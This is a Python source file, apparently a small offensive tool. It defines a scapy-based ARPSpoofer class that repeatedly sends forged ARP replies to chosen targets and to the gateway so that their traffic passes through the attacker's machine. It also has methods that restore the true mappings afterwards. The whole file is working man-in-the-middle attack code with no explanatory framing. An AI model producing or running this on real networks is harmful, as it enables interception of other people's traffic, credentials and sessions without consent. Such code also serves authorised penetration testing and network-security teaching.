from scapy.all import *
from scapy.layers.l2 import *
import threading

class ARPSpoofer:
    def __init__(self, targets, gateway_ip, gateway_mac, my_mac, stop_event):
        self.targets = targets
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.my_mac = my_mac
        self.stop_event = stop_event

    def spoof(self, target):
        packet_to_victim = Ether(dst=target["mac"]) / ARP(op=2, pdst=target["ip"], hwdst=target["mac"],
                                                          psrc=self.gateway_ip, hwsrc=self.my_mac)
        packet_to_gateway = Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                                                              psrc=target["ip"], hwsrc=self.my_mac)
        sendp(packet_to_victim, verbose=False)
        sendp(packet_to_gateway, verbose=False)

    def spoof_loop(self):
        while not self.stop_event.is_set():
            for target in self.targets.copy():
                self.spoof(target)
            self.stop_event.wait(5)

    def restore(self, target):
        packet_to_victim = Ether(dst=target["mac"]) / ARP(op=2, pdst=target["ip"], hwdst=target["mac"],
                                                          psrc=self.gateway_ip, hwsrc=self.gateway_mac)
        packet_to_gateway = Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                                                              psrc=target["ip"], hwsrc=target["mac"])
        sendp(packet_to_victim, verbose=False)
        sendp(packet_to_gateway, verbose=False)

    def restore_all(self):
        for target in self.targets.copy():
            self.restore(target)
